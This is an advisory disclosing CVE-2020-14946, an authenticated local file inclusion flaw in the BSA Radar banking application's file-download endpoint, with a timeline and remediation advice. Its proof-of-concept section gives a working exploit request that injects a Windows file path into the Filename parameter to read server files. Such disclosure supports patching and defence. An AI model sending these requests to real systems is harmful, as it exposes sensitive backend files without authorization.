I. VULNERABILITY
-------------------------
Local File Inclusion - BSA Radar (Authenticated) 

II. BACKGROUND
-------------------------
BSA Radar is a banking application provided by GLOBAL Radar which is implemented within corporate environments to perform SWIFT transactions, approve and review transactions, manage documents, manage users and roles and other features.

III. DESCRIPTION
-------------------------
The Administrator section of the Surveillance module in Global RADAR - BSA Radar 1.6.7234.X  allows users to download transaction files. When downloading the files, a user is able to view local files on the web server by manipulating the FileName and FilePath parameters in the URL, or while using a proxy. This vulnerability could be used to view local sensitive files or configuration files on the backend server.

Vulnerable endpoint: **/UC/downloadFile.ashx**

The current user is required to have valid privileges to send requests to the target vulnerable endpoint.

IV. History
-------------------------
The vulnerability was originally disclosed to the vendor on November 4, 2019.  
The CVE was originally submitted on June 19, 2020.  
CVE assigned: CVE-2020-14946

V. PROOF OF CONCEPT
-------------------------
HTTP Request PoC:
```
VALID REQUEST:
GET /UC/downloadFile.ashx?ID=XXXX&FileName=SOMEFILE.TXT&UploadStyle=1&UploadStyle=1&UploadSource=6

LFI EXPLOIT REQUEST:
GET /UC/downloadFile.ashx?ID=XXXX&Filename=C:\Windows\debug\NetSetup.log&UploadStyle=1&UploadSource=6

The entire LFI path can be injected into the "Filename" parameter in order to enumerate existing files on the server. Other LFI files can be tested (such as the Windows hosts file) for further verification.
```

VI. BUSINESS IMPACT
-------------------------
Disclosure of internal backend server files on the affected systems. 

VII. SYSTEMS AFFECTED
-------------------------
BSA Radar - Version 1.6.7234.24750 and lower.

VIII. SOLUTION
-------------------------
Restrict application requests to deny efforts that are requesting files outside of the current application and file directory. This should prevent users from accessing arbitrary file names or file types within any other application or server directory. 
Whitelist input characters to prevent potential LFI or directory traversal attacks (such as ../, ..\ or directories).
